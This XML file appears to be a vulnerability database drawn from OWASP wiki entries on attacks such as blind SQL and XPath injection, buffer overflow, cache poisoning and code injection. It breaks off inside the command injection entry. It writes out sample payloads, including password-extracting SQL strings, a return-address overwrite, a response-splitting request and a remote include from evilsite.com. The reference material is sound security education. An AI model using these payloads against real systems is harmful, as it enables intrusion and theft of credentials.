<?xml version="1.0" encoding="UTF-8"?>
<?xml-stylesheet type="text/xsl" href="vulsdb.xsl"?>
<vulcategories>
  <vul>
    <name>Account lockout attack</name>
    <description>In an account lockout attack, an attacker attempts to lock out user accounts by purposely failing the authentication process as many times as needed to trigger the account lockout functionality. This in turn prevents even the valid user from obtaining access to their account. For example, if an account lockout policy states that users are locked out of their accounts after three failed login attempts, an attacker can lock out accounts by deliberately sending an invalid password three times. On a large scale, this attack can be used as one method in launching a denial of service attack on many accounts. The impact of such an attack is compounded when there is a significant amount of work required to unlock the accounts to allow users to attempt to authenticate again. </description>
    <environment />
    <example>===eBay Account Lockout Attack===

At one time, eBay displayed the user-id of the highest bidder for a given auction. In the final minutes of the auction, an attacker who was wanting to outbid the current highest bidder could attempt to authenticate three times using the targeted account. After three deliberately incorrect authentication attempts, eBay password throttling would lock out the highest bidder's account for a certain amount of time.  An attacker could then make their own bid and the legitimate user would not have a chance to place a counter-bid because they would be locked out of their account. </example>
    <determination />
    <protection />
  </vul>
  <vul>
    <name>Asymmetric resource consumption</name>
    <description>Asymmetric resource consumption consists in an attacker forcing a web application to consume excessive resources when the application fails to release, or incorrectly releases, a system resource.
</description>
    <environment />
    <example>===Example 1===
The following method never closes the file handle it opens. The Finalize() method for StreamReader eventually calls Close(), but there
is no guarantee how long it is going to take before the Finalize() method is invoked. In fact, there is no guarantee that Finalize() will ever be invoked. In a busy environment, this can result in using up all available file handles.
&lt;pre&gt;
private void processFile(string fName) {
 StreamWriter sw = new
 StreamWriter(fName);
 string line;
 while ((line = sr.ReadLine()) != null) processLine(line);
}
&lt;/pre&gt;
After using up all handles (file descriptors) the application may become very unstable, slow, or may stop working, significantly impacting the applications usability.

===Example 2===
Under normal conditions, the following C# code executes a database query, processes the results returned by the database, and closes the allocated SqlConnection object. If an exception occurs while executing the SQL, or processing the results, the code does not close the SqlConnection object. If this happens enough times, the database runs out of available cursors and is not able to execute any more queries.

C# Example:
&lt;pre&gt;
...
SqlConnection conn = new SqlConnection(connString);
SqlCommand cmd = new SqlCommand(queryString);
cmd.Connection = conn; conn.Open();
SqlDataReader rdr = cmd.ExecuteReader();
HarvestResults(rdr);
conn.Connection.Close();
...
&lt;/pre&gt;
The number of concurent connections to the databases is often lower than maximum number of possible handles for the system to use.
This allows application bottlenecks to negatively impact or stop the application.

===Example 3===
If an application can handle N concurent connections and does not implement an appropriate mechanism to disconnect clients (e.g. TIMEOUTs), it becomes very easy to adversely affect the application by simply establishing close to N connections. Additionally, those multiple connections could be used to simulate interaction with the application until exhaustion of available resources.</example>
    <determination />
    <protection />
  </vul>
  <vul>
    <name>Binary planting</name>
    <description>[[Binary planting]] is a general term for an attack where the attacker places (i.e., plants) a binary file containing malicious code to a local or remote file system in order for a vulnerable application to load and execute it.

There are various ways this attack can occur:

# Insecure access permissions on a local directory allow a local attacker to plant the malicious binary in a trusted location. (A typical example is an application installer not properly configuring permissions on directories used to store application files.)
# One application may be used for planting a malicious binary in another application's trusted location. (An example is the [http://technet.microsoft.com/en-us/security/advisory/953818 Internet Explorer - Safari blended threat vulnerability] )
# The application searches for a binary in untrusted locations, possibly on remote file systems. (A typical example is a Windows application loading a dynamic link library from the current working directory after the latter has been set to a network shared folder.)
</description>
    <environment />
    <example>=== Insecure Access Permissions-based Attack ===

# A Windows application installer creates a root directory (C:\Application) and installs the application in it, but fails to limit write access to the directory for non-privileged users.
# Suppose the application (C:\Application\App.exe) loads the WININET.DLL library by calling LoadLibrary("WININET.DLL"). This library is expected to be found in the Windows System32 folder.
# Local user A plants a malicious WININET.DLL library in C:\Application
# Local user B launches the application, which loads and executes the malicious WININET.DLL instead of the legitimate one.

=== Current Working Directroy-based Attack ===

# Suppose a Windows application loads the DWMAPI.DLL library by calling LoadLibrary("DWMAPI.DLL"). This library is expected to be found in the Windows System32 folder, but only exists on Windows Vista and Windows 7.
# Suppose the application is associated with the ".bp" file extension.
# The attacker sets up a network shared folder and places files honeypot.bp and DWMAPI.DLL in this folder (possibly marking the latter as hidden).
# The attacker invites a Windows XP user to visit the shared folder with Windows Explorer.
# When the user double-clicks on honeypot.bp, user's Windows Explorer sets the current working directory to the remote share and launches the application for opening the file.
# The application tries to load DWMAPI.DLL, but failing to find it in the Windows system directories, it loads and executes it from the attacker's network share.</example>
    <determination />
    <protection />
  </vul>
  <vul>
    <name>Blind SQL Injection</name>
    <description>Blind SQL (Structured Query Language) injection is a type of [[SQL Injection]] attack that asks the database true or false questions and determines the answer based on the applications response. This attack is often used when the web application is configured to show generic error messages, but has not mitigated the code that is vulnerable to SQL injection.

When an attacker exploits SQL injection, sometimes the web application displays error messages from the database complaining that the SQL Query's syntax is incorrect. Blind SQL injection is nearly identical to normal [[SQL Injection]], the only difference being the way the data is retrieved from the database. When the database does not output data to the web page, an attacker is forced to steal data by asking the database a series of true or false questions. This makes exploiting the SQL Injection vulnerability more difficult, but not impossible. .</description>
    <environment />
    <example>An attacker may verify whether a sent request returned true or false in a few ways:

===Content-based===
Using a simple page, which displays an article with given ID as the parameter, the attacker may perform a couple of simple tests to determine if the page is vulnerable to SQL Injection attacks.

Example URL:
&lt;pre&gt;
http://newspaper.com/items.php?id=2
&lt;/pre&gt;
sends the following query to the database:
&lt;pre&gt;
SELECT title, description, body FROM items WHERE ID = 2
&lt;/prE&gt;
The attacker may then try to inject a query that returns 'false':
&lt;pre&gt;
http://newspaper.com/items.php?id=2 and 1=2
&lt;/pre&gt;
Now the SQL query should looks like this:
&lt;pre&gt;
SELECT title, description, body FROM items WHERE ID = 2 and 1=2
&lt;/pre&gt;
If the web application is vulnerable to SQL Injection, then it probably will not return anything. To make sure, the attacker will inject a query that will return 'true':
&lt;pre&gt;
http://newspaper.com/items.php?id=2 and 1=1
&lt;/pre&gt;
If the content of the page that returns 'true' is different than that of the page that returns 'false', then the attacker is able to distinguish when the executed query returns true or false.

Once this has been verified, the only limitations are privileges set up by the database administrator, different SQL syntax, and the attacker's imagination.


===Time-based===

This type of blind SQL injection relies on the database pausing for a specified amount of time, then returning the results, indicating successful SQL query executing. Using this method, an attacker enumerates each letter of the desired piece of data using the following logic:

If the first letter of the first database's name is an 'A', wait for 10 seconds.

If the first letter of the first database's name is an 'B', wait for 10 seconds. etc.

'''Microsoft SQL Server'''
&lt;pre&gt;
http://www.site.com/vulnerable.php?id=1' waitfor delay '00:00:10'--
&lt;/pre&gt;

'''MySQL'''
&lt;pre&gt;
SELECT IF(expression, true, false)
&lt;/pre&gt;
Using some time-taking operation e.g. BENCHMARK(), will delay server
responses if the expression is True.

&lt;pre&gt;BENCHMARK(5000000,ENCODE('MSG','by 5 seconds'))&lt;/pre&gt; - will execute the ENCODE function 5000000 times.

Depending on the database server's performance and load, it should
take just a moment to finish this operation. The important thing is,
from the attacker's point of view, to specify a high-enough number of BENCHMARK()
function repetitions to affect the database
response time in a noticeable way.

Example combination of both queries:
&lt;pre&gt;
1 UNION SELECT IF(SUBSTRING(user_password,1,1) = CHAR(50),BENCHMARK(5000000,ENCODE('MSG','by 5 seconds')),null) FROM users WHERE user_id = 1;
&lt;/pre&gt;
If the database response took a long time, we may expect that the first user password character with user_id = 1 is character '2'.
&lt;pre&gt;
(CHAR(50) == '2')
&lt;/pre&gt;
Using this method for the rest of characters, it's possible to enumerate entire passwords stored in the database. This method works even when the attacker injects the SQL queries and the content of the vulnerable page doesn't change.

Obviously, in this example, the names of the tables and the number of columns was specified. However, it's possible to guess them or check with a trial and error method.

Databases other than MySQL also have time-based functions which allow them to be used for time-based attacks:
* MS SQL 'WAIT FOR DELAY '0:0:10''
* PostgreSQL - pg_sleep()

Conducting Blind_SQL_Injection attacks manually is very time consuming, but there are a lot of tools which automate this process. One of them is SQLMap (http://sqlmap.org/) partly developed within OWASP grant program. On the other hand, tools of this kind are very sensitive to even small deviations from the rule. This includes:

* scanning other website clusters, where clocks are not ideally synchronized,
* WWW services where argument acquiring method was changed, e.g.  from /index.php?ID=10 to /ID,10

===Remote Database Fingerprinting===

If the attacker is able to determine when his query returns True or False, then he may fingerprint the RDBMS. This will make the whole attack much easier. If the time-based approach is used, this helps determine what type of database is in use. Another popular methods to do this is to call functions which will return the current date. MySQL, MSSQL, and Oracle have different functions for that, respectively ''now()'', ''getdate()'', and ''sysdate()''.</example>
    <determination />
    <protection />
  </vul>
  <vul>
    <name>Blind XPath Injection</name>
    <description>XPath is a type of query language that describes how to locate specific elements (including attributes, processing instructions,
etc.) in an XML document. Since it is a query language, XPath is somewhat similar to Structured Query Language (SQL), however, XPath is different in that it
can be used to reference almost any part of an XML document without access control restrictions. In SQL, a "user" (which is a term undefined in the XPath/XML context) may be restricted to certain databases, tables, columns, or queries. Using an XPATH Injection attack, an attacker is able to modify the XPATH query to perform an action of his choosing.

Blind XPath Injection attacks can be used to extract data from an application that embeds user supplied data in an unsafe way. When input is not properly sanitized, an attacker can supply valid XPath code that is executed. This type of attack is used in situations where the attacker has no knowledge about the structure of the XML document, or perhaps error message are suppressed, and is only able to pull once piece of information at a time by asking true/false questions(booleanized queries), much like [[Blind SQL Injection]].

For more information, please see the article on regular [[XPATH Injection]].</description>
    <environment />
    <example>The attacker may mount a successful attack using two methods: Boolenization and XML Crawling. By adding to the XPath syntax, the attacker uses additional expressions (replacing what the attacker entered in the place of the injection).

===Boolenization===
Using the "Boolenization" method the attacker may find out if the given XPath expression is True or False. Let's assume that the aim of the attacker is to log in to an account in a web application. A Successful log in would return "True" and failed log in attempt would return "False". Only a small portion of the information is targeted via the analyzed character or number. When the attacker focuses on a string he may reveal it in its entirety by checking every single character within the class/range of characters this string belongs to.



Using a ''string-length(S)'' function, where S is a string, the attacker may find out the length of this string. With the appropriate number of ''substring(S,N,1)'' function iterations, where S is a previously mentioned string, N is a start character, and "1" is a next character counting from N character, the attacker is able to enumerate the whole string.


Code:
&lt;pre&gt;
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;data&gt;
   &lt;user&gt;
   &lt;login&gt;admin&lt;/login&gt;
   &lt;password&gt;test&lt;/password&gt;
   &lt;realname&gt;SuperUser&lt;/realname&gt;
   &lt;/user&gt;
   &lt;user&gt;
   &lt;login&gt;rezos&lt;/login&gt;
   &lt;password&gt;rezos123&lt;/password&gt;
   &lt;realname&gt;Simple User&lt;/realname&gt;
   &lt;/user&gt;
&lt;/data&gt;
&lt;/pre&gt;
Function:

* ''string.stringlength(//user[position()=1]/child::node()[position()=2])'' returns the length of the second string of the first user (8),
* ''substring((//user[position()=1]/child::node()[position()=2),1,1)'' returns the first character of this user ('r').

===XML Crawling===

To get to know the XML document structure the attacker may use:

* count(expression)
&lt;pre&gt;
count(//user/child::node()
&lt;/pre&gt;
This will return the number of nodes (in this case 2).

* stringlength(string)
&lt;pre&gt;
string-length(//user[position()=1]/child::node()[position()=2])=6
&lt;/pre&gt;
Using this query the attacker will find out if the second string (password) of the first node (user 'admin') consists of 6 characters.

* substring(string, number, number)
&lt;pre&gt;
substring((//user[position()=1]/child::node()[position()=2]),1,1)="a"
&lt;/pre&gt;
This query will confirm (True) or deny (False) that the first character of the user ('admin') password is an "a" character.


If the log in form would look like this:

C#:
&lt;pre&gt;
String FindUser;
FindUser = "//user[login/text()='" + Request("Username") + "' And
      password/text()='" + Request("Password") + "']";
&lt;/pre&gt;
then the attacker should inject the following code:
&lt;pre&gt;
Username: ' or substring((//user[position()=1]/child::node()[position()=2]),1,1)="a" or ''='
&lt;/pre&gt;

The XPath syntax may remind you of common [[SQL Injection]] attacks but the attacker must consider that this language disallows commenting
out the rest of expresssion. To omit this limitation the attacker should use OR expressions to void all expressions, which may disrupt the attack.

Because of ''Boolenization'' the number of queries, even within a small XML document, may be very high (thousands, houndred of thousands and more). That is why this attack is not conducted manually. Knowing a few basic XPath functions, the attacker is able to write an application in a short time which will rebuild the structure of the document and will fill it with data by itself.</example>
    <determination />
    <protection />
  </vul>
  <vul>
    <name>Brute force attack</name>
    <description>A brute force attack can manifest itself in many different ways, but primarily consists in an attacker configuring predetermined values, making requests to a server using those values, and then analyzing the response. For the sake of efficiency, an attacker may use a dictionary attack (with or without mutations) or a traditional brute-force attack (with given classes of characters e.g.: alphanumerical, special, case (in)sensitive). Considering a given method, number of tries, efficiency of the system which conducts the attack, and estimated efficiency of the system which is attacked the attacker is able to calculate approximately how long it will take to submit all chosen predetermined values. </description>
    <environment />
    <example>Brute-force attacks are often used for attacking authentication and discovering hidden content/pages within a web application. These attacks are usually sent via GET and POST requests to the server. In regards to authentication, brute force attacks are often mounted when an [https://www.owasp.org/index.php/Authentication_Cheat_Sheet#Implement_Account_Lockout account lockout policy] in not in place.

===Example 1===

A web application can be attacked via brute force by taking a word list of known pages, for instance from a popular content management system, and simply requesting each known page then analyzing the HTTP response code to determine if the page exists on the target server.

[https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project DirBuster] is a tool that does exactly this.

Other tools for this type of attack are as follows:

 - dirb (http://sourceforge.net/projects/dirb/)
 - WebRoot (http://www.cirt.dk/tools/webroot/WebRoot.txt)


Dirb is capable of:
 - set cookies
 - add any HTTP header
 - use PROXY
 - mutate objects which were found
 - test http(s) connections
 - seek catalogues and/or files using defined dictionaries and templates
 - and much much more


The simplest test to perform is:
&lt;pre&gt;
rezos@dojo ~/d/owasp_tools/dirb $ ./dirb http://testsite.test/
-----------------
DIRB v1.9
By The Dark Raver
-----------------
START_TIME: Mon Jul  9 23:13:16 2007
URL_BASE: http://testsite.test/
WORDLIST_FILES: wordlists/common.txt
SERVER_BANNER: lighttpd/1.4.15
NOT_EXISTANT_CODE: 404 [NOT FOUND]
(Location: '' - Size: 345)

-----------------

Generating Wordlist...
Generated Words: 839

---- Scanning URL: http://testsite.test/ ----
FOUND: http://testsite.test/phpmyadmin/
       (***) DIRECTORY (*)
&lt;/pre&gt;
In the output the attacker is informed that phpmyadmin/ directory was found. The attacker has now found a potential directory of interest within this application. In dirb's templates there are, among others, a dictionary containing information about invalid httpd configurations. This dictionary will detect weaknesses of this kind.

The application [http://www.cirt.dk/tools/webroot/WebRoot.txt WebRoot.pl], written by CIRT.DK, has embedded mechanisms for parsing server responses, and based on the phrase specified by the attacker,  measures if the server response is expected.

For example:


Np.

./WebRoot.pl -noupdate -host testsite.test -port 80 -verbose -match "test" -url "/private/&lt;BRUTE&gt;" -incremental lowercase -minimum 1 -maximum 1


 oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00
 o          Webserver Bruteforcing 1.8          o
 0  ************* !!! WARNING !!! ************  0
 0  ******* FOR PENETRATION USE ONLY *********  0
 0  ******************************************  0
 o       (c)2007 by Dennis Rand - CIRT.DK       o
 oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00

 [X] Checking for updates                - NO CHECK
 [X] Checking for False Positive Scan    - OK
 [X] Using Incremental                   - OK
 [X] Starting Scan                       - OK
    GET /private/b HTTP/1.1
    GET /private/z HTTP/1.1

 [X] Scan complete                       - OK
 [X] Total attempts                      - 26
 [X] Sucessfull attempts                 - 1
 oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00

WebRoot.pl found one file "/private/b" on testsite.test, which contains phrase "test".


Another example is to examine ranges of the variable's values:
&lt;pre&gt;
./WebRoot.pl -noupdate -host testsite.test -port 80 -verbose -diff "Error" -url "/index.php?id=&lt;BRUTE&gt;" -incremental integer -minimum 1 -maximum 1
&lt;/pre&gt;


;Road Blocks:

One of the main issues with tools like dirb/dirbuster consist in the analysis of server responses. With more advanced server configuration (e.g. with mod_rewrite) automatic tools are sometimes unable to determine "File not found" errors due to the server response being an HTTP response code 200 but the page itself indicates "File not found". This can lead to false positives if the brute force tool is only relying on HTTP response codes.

An advanced application assessment tool, such as [http://portswigger.net/ Burp Suite], can be used to parse specific parts of the page returned, looking for certain strings in an effort to reduce false positives.

===Example 2===

In regards to authentication, when no password policy is in place an attacker can use lists of common username and passwords to brute force a username and/or password field until successful authentication.</example>
    <determination>'''Php-Brute-Force-Attack Detector'''

http://yehg.net/lab/pr0js/files.php/php_brute_force_detect.zip

Detect your web servers being scanned by brute force tools such as WFuzz, OWASP DirBuster and vulnerability scanners such as Nessus, Nikto, Acunetix ..etc. This helps you quickly identify probable probing by bad guys who's wanna dig possible security holes.

http://yehg.net/lab/pr0js/tools/php-brute-force-detector-readme.pdf
</determination>
    <protection />
  </vul>
  <vul>
    <name>Buffer overflow attack</name>
    <description>Buffer overflow errors are characterized by the overwriting of memory
fragments of the process, which should have never been modified
intentionally or unintentionally.
Overwriting values of the IP (Instruction Pointer), BP (Base Pointer)
and other registers causes exceptions, segmentation faults, and other
errors to occur. Usually these errors end execution of the application
in an unexpected way.
Buffer overflow errors occur when we operate on buffers of char type.

Buffer overflows can consist of overflowing the stack ([[Stack overflow]]) or overflowing the heap ([[Heap overflow]]).
We don't distinguish between these two in this article to avoid confusion.

Below examples are written in C language under GNU/Linux system on x86 architecture.</description>
    <environment />
    <example>===Example 1===
&lt;pre&gt;
  #include &lt;stdio.h&gt;
  int main(int argc, char **argv)
  {
  char buf[8]; // buffer for eight characters
  gets(buf); // read from stdio (sensitive function!)
  printf("%s\n", buf); // print out data stored in buf
  return 0; // 0 as return value
  }
&lt;/pre&gt;
This very simple application reads from the standard input an array of the
characters, and copies it into the buffer of the char type. The size of this
buffer is eight characters. After that, the contents of the buffer is displayed
and the application exits.

Program compilation:
&lt;pre&gt;
  rezos@spin ~/inzynieria $ gcc bo-simple.c -o bo-simple
  /tmp/ccECXQAX.o: In function `main':
  bo-simple.c:(.text+0x17): warning: the `gets' function is dangerous and
  should not be used.
&lt;/pre&gt;
At this stage, even  the compiler suggests that the function gets() isn't safe.

Usage example:
&lt;pre&gt;
  rezos@spin ~/inzynieria $ ./bo-simple // program start
  1234 // we eneter "1234" string from the keyboard
  1234 // program prints out the conent of the buffer
  rezos@spin ~/inzynieria $ ./bo-simple // start
  123456789012 // we eneter "123456789012"
  123456789012 // content of the buffer "buf" ?!?!
  Segmentation fault // information about memory segmenatation fault
&lt;/pre&gt;
We manage (un)luckily to execute the faulty operation by
the program, and provoke it to exit abnormally.

Problem analysis:

The program calls a function, which operates on the char type buffer and does no
checks against overflowing the size assigned to this buffer.
As a result, it is possible to intentionally or unintentionally store more
data in the buffer, which will cause an error. The following question arises:
The buffer stores only eight characters, so why did function printf() display twelve?.
The answer comes from the process memory organisation. Four characters which overflowed
the buffer also overwrite the value stored in one of the registers, which was
necessary for the correct function return. Memory continuity resulted in printing
out the data stored in this memory area.

===Example 2===
&lt;pre&gt;
  #include &lt;stdio.h&gt;
  #include &lt;string.h&gt;

  void doit(void)
  {
          char buf[8];

          gets(buf);
          printf("%s\n", buf);
  }

  int main(void)
  {
          printf("So... The End...\n");
          doit();
          printf("or... maybe not?\n");

          return 0;
  }
&lt;/pre&gt;
This example is analogous to the first one. In addition, before and after the doit()
function, we have two calls to function printf().
&lt;pre&gt;
  Compilation:

  rezos@dojo-labs ~/owasp/buffer_overflow $ gcc example02.c -o example02
  -ggdb
  /tmp/cccbMjcN.o: In function `doit':
  /home/rezos/owasp/buffer_overflow/example02.c:8: warning: the `gets'
  function is dangerous and should not be used.

  Usage example:
  rezos@dojo-labs ~/owasp/buffer_overflow $ ./example02
  So... The End...
  TEST                   // user data on input
  TEST                  // print out stored user data
  or... maybe not?
&lt;/pre&gt;
The program between the two defined printf() calls displays the content of the buffer,
which is filled with data entered by the user.
&lt;pre&gt;
  rezos@dojo-labs ~/owasp/buffer_overflow $ ./example02
  So... The End...
  TEST123456789
  TEST123456789
  Segmentation fault
&lt;/pre&gt;
Because the size of the buffer was defined (char buf[8]) and it was filled it with
thirteen characters of char type, the buffer was overflowed.

If our binary application is in ELF format, then we are able to use an objdump
program to analise it and find necessery information to exploit the buffer overflow
error.

Below is output produced by the objdump. From that output we are able to
find addresses, where printf() is called (0x80483d6 and 0x80483e7).
&lt;pre&gt;
  rezos@dojo-labs ~/owasp/buffer_overflow $ objdump -d ./example02

  080483be &lt;main&gt;:
   80483be:       8d 4c 24 04             lea    0x4(%esp),%ecx
   80483c2:       83 e4 f0                and    $0xfffffff0,%esp
   80483c5:       ff 71 fc                pushl  0xfffffffc(%ecx)
   80483c8:       55                      push   %ebp
   80483c9:       89 e5                   mov    %esp,%ebp
   80483cb:       51                      push   %ecx
   80483cc:       83 ec 04                sub    $0x4,%esp
   80483cf:       c7 04 24 bc 84 04 08    movl   $0x80484bc,(%esp)
   80483d6:       e8 f5 fe ff ff          call   80482d0 &lt;puts@plt&gt;
   80483db:       e8 c0 ff ff ff          call   80483a0 &lt;doit&gt;
   80483e0:       c7 04 24 cd 84 04 08    movl   $0x80484cd,(%esp)
   80483e7:       e8 e4 fe ff ff          call   80482d0 &lt;puts@plt&gt;
   80483ec:       b8 00 00 00 00          mov    $0x0,%eax
   80483f1:       83 c4 04                add    $0x4,%esp
   80483f4:       59                      pop    %ecx
   80483f5:       5d                      pop    %ebp
   80483f6:       8d 61 fc                lea    0xfffffffc(%ecx),%esp
   80483f9:       c3                      ret
   80483fa:       90                      nop
   80483fb:       90                      nop
&lt;/pre&gt;
If the second call to printf() would inform the administrator about user
logout (e.g. closed session), then we can try to omit this step and
finish without the call to printf().
&lt;pre&gt;
rezos@dojo-labs ~/owasp/buffer_overflow $ perl -e 'print "A"x12
."\xf9\x83\x04\x08"' | ./example02
So... The End...
AAAAAAAAAAAAu*.
Segmentation fault
&lt;/pre&gt;
The application finished its execution with segmentation fault, but the second
call to printf() had no place.

A few words of explanation:

perl -e 'print "A"x12 ."\xf9\x83\x04\x08"' - will print out twelve "A" 
characters and then four characters, which are in fact an address of the 
instruction we want to execute. Why twelve?
&lt;pre&gt;
     8 // size of buf (char buf[8])
  +  4 // four additional bytes for overwriting stack frame pointer
  ----
    12
&lt;/pre&gt;
Problem analysis:

The issue is the same as in the first example. There is no control over 
the size of the copied buffer into the previously declared one. In this 
example we overwrite the EIP register with address 0x080483f9, which is in 
fact a call to ret in the last phase of the program execution.

How to use buffer overflow errors in a different way?

Generally, exploitation of these errors may lead to:
* application DoS
* reordering execution of functions
* code execution (if we are able to inject the shellcode,  described in the separate document)
[[Category:FIXME|which separate document? we should link to it.]]

How are buffer overflow errors are made?

These kinds of errors are very easy to make. For years they were a programmer's
nightmare. The problem lies in native C functions, which don't care about doing
appropriate buffer length checks. Below is the list of such functions and, if they exist,
their safe equivalents:

* gets() -&gt; fgets() - read characters
* strcpy() -&gt; strncpy() - copy content of the buffer
* strcat() -&gt; strncat() - buffer concatenation
* sprintf() -&gt; snprintf() - fill buffer with data of different types
* (f)scanf() - read from STDIN
* getwd() - return working directory
* realpath() - return absolute (full) path

Use safe equivalent functions, which check the buffers length, whenever it's possible.
Namely:
#gets() -&gt; fgets()
#strcpy() -&gt; strncpy()
#strcat() -&gt; strncat()
#sprintf() -&gt; snprintf()

Those functions which don't have safe equivalents should be rewritten
with safe checks implemented. Time spent on that will benefit in the future.
Remember that you have to do it only once.

Use compilers, which are able to identify unsafe functions, logic errors and
check if the memory is overwritten when and where it shouldn't be.
</example>
    <determination />
    <protection />
  </vul>
  <vul>
    <name>Cache Poisoning</name>
    <description>The impact of a maliciously constructed response can be magnified if it is cached either by a web cache used by multiple users or even the browser cache of a single user. If a response is cached in a shared web cache, such as those commonly found in proxy servers, then all users of that cache will continue to receive the malicious content until the cache entry is purged. Similarly, if the response is cached in the browser of an individual user, then that user will continue to receive the malicious content until the cache entry is purged, although only the user of the local browser instance will be affected.

To successfully carry out such an attack, an attacker:
* Finds the vulnerable service code, which allows them to fill the HTTP header field with many headers.
* Forces the cache server to flush its actual cache content, which we want to be cached by the servers.
* Sends a specially crafted request, which will be stored in cache.
* Sends the next request. The previously injected content stored in cache will be the response to this request.

This attack is rather difficult to carry out in a real environment. The list of conditions is long and hard to
accomplish by the attacker. However it's easier to use this technique than [[Cross-User Defacement]].

A Cache Poisoning attack is possible because of [[HTTP Response Splitting]] and flaws in the web application. It is crucial from
the attacker's point of view that the application allows for filling the header field with more than one header using CR
(Carrige Return) and LF (Line Feed) characters.
</description>
    <environment />
    <example>We have found a web page, which gets its service name from the "page" argument and then redirects (302)
to this service.

e.g.
http://testsite.com/redir.php?page=http://other.testsite.com/

And exemplary code of the redir.php:
&lt;pre&gt;
rezos@dojo ~/public_html $ cat redir.php
&lt;?php
header ("Location: " . $_GET['page']);
?&gt;
&lt;/pre&gt;
Crafting appropriate request: [1]

1 - remove page from the cache
&lt;pre&gt;
GET http://testsite.com/index.html HTTP/1.1
Pragma: no-cache
Host: testsite.com
User-Agent: Mozilla/4.7 [en] (WinNT; I)
Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,
image/png, */*
Accept-Encoding: gzip
Accept-Language: en
Accept-Charset: iso-8859-1,*,utf-8
&lt;/pre&gt;
HTTP header fields "Pragma: no-cache" or "Cache-Control: no-cache" will remove the page from cache (if the page
is stored in cache, obviously).

2 - using HTTP Response Splitting we force cache server to generate two responses to one request
&lt;pre&gt;
GET http://testsite.com/redir.php?site=%0d%0aContent-
Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aLast-
Modified:%20Mon,%2027%20Oct%202009%2014:50:18%20GMT%0d%0aConte
nt-Length:%2020%0d%0aContent-
Type:%20text/html%0d%0a%0d%0a&lt;html&gt;deface!&lt;/html&gt; HTTP/1.1
Host: testsite.com
User-Agent: Mozilla/4.7 [en] (WinNT; I)
Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,
image/png, */*
Accept-Encoding: gzip
Accept-Language: en
Accept-Charset: iso-8859-1,*,utf-8
&lt;/pre&gt;
We are intentionally setting the future time (in the header it's set to 27 October 2009) in the second
response HTTP header "Last-Modified" to store the response in the cache.
[[Category:FIXME|need to update now that it's 2009]]

We may get this effect by setting the following headers:
* Last-Modified (checked byt the If-Modified-Since header)
* ETag (checked by the If-None-Match header)

3 - sending request for the page, which we want to replace in the cache of the server
&lt;pre&gt;
GET http://testsite.com/index.html HTTP/1.1
Host: testsite.com
User-Agent: Mozilla/4.7 [en] (WinNT; I)
Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,
image/png, */*
Accept-Encoding: gzip
Accept-Language: en
Accept-Charset: iso-8859-1,*,utf-8
&lt;/pre&gt;
In theory, the  cache server should match the second answer from the request #2 to the request #3. In this way we've replaced
the cache content.

The rest of the requests should be executed during one connection (if the cache server doesn't require a more sophisticated
method to be used), possibly immediately one after another.

It may appear problematic to use this attack as a universal techique for cache poisoning. It's due to cache server's different
connection model and request proccessing implementations. What does it mean? That for example effective method to poison
Apache 2.x cache with mod_proxy and mod_cache modules won't work with Squid.
[[Category:FIXME|I wasn't sure what the first 2 sentences were trying to say, can someone take a look at these?]]

A different problem is the length of the URI, which sometime makes it impossible to put the necessary response header, which
would next be matched to the request for the poisoned page.

The request examples used are from [1], which were modified on the needs of the article.

More information can be found in this document, which focuses on these kinds of attacks [1]
http://packetstormsecurity.org/papers/general/whitepaper_httpresponse.pdf by Amit Klein, Director of Security and Research</example>
    <determination />
    <protection />
  </vul>
  <vul>
    <name>Cash Overflow</name>
    <description>A Cash Overflow attack is a [[Denial of Service]] attack specifically aimed at exceeding the hosting costs for a cloud application, either essentially bankrupting the service owner or exceeding the application cost limits, leading the cloud service provider to disable the application.
</description>
    <environment />
    <example />
    <determination />
    <protection />
  </vul>
  <vul>
    <name>Code Injection</name>
    <description>Code Injection is the general term for attack types which consist of injecting code that is then interpreted/executed by the application. This type of attack exploits poor handling of untrusted data. These types of attacks are usually made possible due to a lack of proper input/output data validation, for example:

* allowed characters (standard regular expressions classes or custom)
* data format
* amount of expected data

Code Injection differs from [[Command Injection]] in that an attacker is only limited by the functionality of the injected language itself. If an attacker is able to inject PHP code into an application and have it executed, he is only limited by what PHP is capable of. Command injection consists of leveraging existing code to execute commands, usually within the context of a shell.</description>
    <environment />
    <example>'''Example 1'''

If an application passes a parameter sent via a GET request to the PHP include() function with no input validation, the attacker may try to execute code other than what the developer had in mind.

The URL below passes a page name to the include() function.

http://testsite.com/index.php?page=contact.php

The file "evilcode.php" may contain, for example, the phpinfo() function which is useful for gaining information about the configuration of the environment in which the web service runs. An attacker can ask the application to execute his PHP code using the following request:

http://testsite.com/?page=http://evilsite.com/evilcode.php

'''Example 2'''

When a developer uses the PHP eval() function and passes it untrusted data that an attacker can modify, code injection could be possible.

The example below shows a dangerous way to use the eval() function:

&lt;pre&gt;
$myvar = "varname";
$x = $_GET['arg'];
eval("\$myvar = \$x;");
&lt;/pre&gt;

As there is no input validation, the code above is vulnerable to a Code Injection attack.

For example: 
&lt;pre&gt;
/index.php?arg=1; phpinfo()
&lt;/pre&gt;
While exploiting bugs like these, an attacker may want to execute system commands. In this case, a code injection bug can also be used for command injection, for example:

&lt;pre&gt;
/index.php?arg=1; system('id')
&lt;/pre&gt;</example>
    <determination />
    <protection />
  </vul>
  <vul>
    <name>Command Injection</name>
    <description>Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell. In this attack, the attacker-supplied operating system commands are usually executed with the privileges of the vulnerable application. Command injection attacks are possible largely due to insufficient input validation.

This attack differs from [[Code Injection]], in that code injection allows the attacker to add his own code that is then executed by the application. In [[Code Injection]], the attacker extends the default functionality of the application without the necessity of executing system commands.

&lt;!--==Risk Factors==
TBD
--&gt;</description>
    <environment />
    <example>===Example 1===

The following code is a wrapper around the UNIX command ''cat'' which prints the contents of a file to standard output. It is also injectable:

&lt;pre&gt;

#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;

int main(int argc, char **argv) {
 char cat[] = "cat ";
 char *command;
 size_t commandLength;

